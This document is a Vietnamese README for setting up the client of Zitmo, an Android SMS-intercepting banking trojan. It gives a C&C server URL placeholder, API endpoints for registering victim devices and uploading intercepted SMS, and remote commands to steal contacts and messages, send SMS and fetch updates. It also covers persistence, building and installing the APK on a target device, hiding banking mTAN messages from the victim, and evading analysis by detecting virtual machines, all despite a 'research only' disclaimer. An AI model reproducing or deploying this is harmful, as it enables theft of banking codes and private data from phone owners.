# Cấu hình Zitmo Client

## Cấu hình server C&C

Để kết nối client Zitmo với máy chủ C&C, hãy thực hiện các bước sau:

1. Chỉnh sửa cấu hình mặc định trong file `ZitmoUtils.java`:

```java
private static final String SERVER_URL_DEFAULT = "http://YOUR_SERVER_IP:5000";
```

Thay `YOUR_SERVER_IP` bằng địa chỉ IP hoặc tên miền của máy chủ C&C. Mặc định, ứng dụng sẽ kết nối đến cổng 5000.

## Các endpoint API

Client Zitmo được cấu hình để giao tiếp với server thông qua các endpoint sau:

### 1. Đăng ký thiết bị
**Endpoint**: `/register`  
**Method**: POST  
**Dữ liệu gửi**:
```json
{
    "device_id": "unique_device_identifier",
    "device_info": "thông tin thiết bị (model, OS version...)",
    "phone_number": "số điện thoại của thiết bị",
    "operator": "nhà mạng di động"
}
```

### 2. Gửi SMS bị chặn
**Endpoint**: `/intercepted_sms`  
**Method**: POST  
**Dữ liệu gửi**:
```json
{
    "device_id": "unique_device_identifier",
    "sender": "người gửi SMS",
    "message": "nội dung SMS",
    "timestamp": "thời gian nhận (YYYY-MM-DD HH:MM:SS)"
}
```

### 3. Ping và nhận lệnh mới
**Endpoint**: `/ping`  
**Method**: POST  
**Dữ liệu gửi**:
```json
{
    "device_id": "unique_device_identifier"
}
```

### 4. Báo cáo thực thi lệnh
**Endpoint**: `/command_executed`  
**Method**: POST  
**Dữ liệu gửi**:
```json
{
    "device_id": "unique_device_identifier",
    "command_id": command_id,
    "result": "kết quả thực thi lệnh"
}
```

## Các loại lệnh hỗ trợ

Client Zitmo có thể xử lý các loại lệnh sau từ máy chủ C&C:

| Loại lệnh   | Mô tả             | Dữ liệu lệnh                                            |
|-------------|-------------------|---------------------------------------------------------|
| get_contacts | Lấy danh bạ       | `{}`                                                    |
| get_sms     | Lấy tin nhắn      | `{"limit": số_lượng}`                                   |
| send_sms    | Gửi tin nhắn      | `{"to": "người_nhận", "message": "nội_dung"}`          |
| update      | Cập nhật ứng dụng | `{"url": "đường_dẫn_tải"}`                             |
| uninstall   | Gỡ cài đặt        | `{}`                                                    |

## Chu kỳ hoạt động

- Ping server: 15 phút/lần để báo cáo trạng thái và nhận lệnh mới
- Chặn SMS: Ngay lập tức khi có SMS mới
- Khởi động tự động: Khi thiết bị khởi động hoặc khi ứng dụng được cập nhật
- Duy trì hoạt động: Sử dụng foreground service, wakeLock và AlarmManager để đảm bảo hoạt động liên tục

## Xây dựng và Triển khai

1. Tạo project Android Studio từ mã nguồn đã cung cấp
2. Thêm file layout `activity_main.xml` và icon `ic_secure.xml`
3. Xây dựng APK thông qua Android Studio: Build > Build Bundle(s) / APK(s) > Build APK(s)
4. APK sẽ được tạo trong thư mục `app/build/outputs/apk/debug/`
5. Cài đặt APK trên thiết bị Android đích

## Lưu ý bảo mật

Mã nguồn này chỉ dành cho mục đích nghiên cứu và giáo dục. Trong môi trường thực tế, nên thêm các cơ chế bảo mật sau:

1. HTTPS cho tất cả giao tiếp API
2. Xác thực tin nhắn và xác thực endpoint
3. Mã hóa dữ liệu được lưu trữ
4. Phát hiện máy ảo và môi trường phân tích để tránh phát hiện

## Chỉnh sửa cấu hình khác

- **Ẩn SMS**: Chỉnh sửa `ZitmoUtils.isHideSMSEnabled()` để kiểm soát việc ẩn SMS chứa mTAN
- **Cấu hình SMS**: Chỉnh sửa `containsSensitiveContent()` trong `SMSReceiver` để điều chỉnh các từ khóa dùng để phát hiện SMS nhạy cảm
- **Thông báo**: Chỉnh sửa thông báo hiển thị trong `createNotification()` để phù hợp với trường hợp sử dụng cụ thể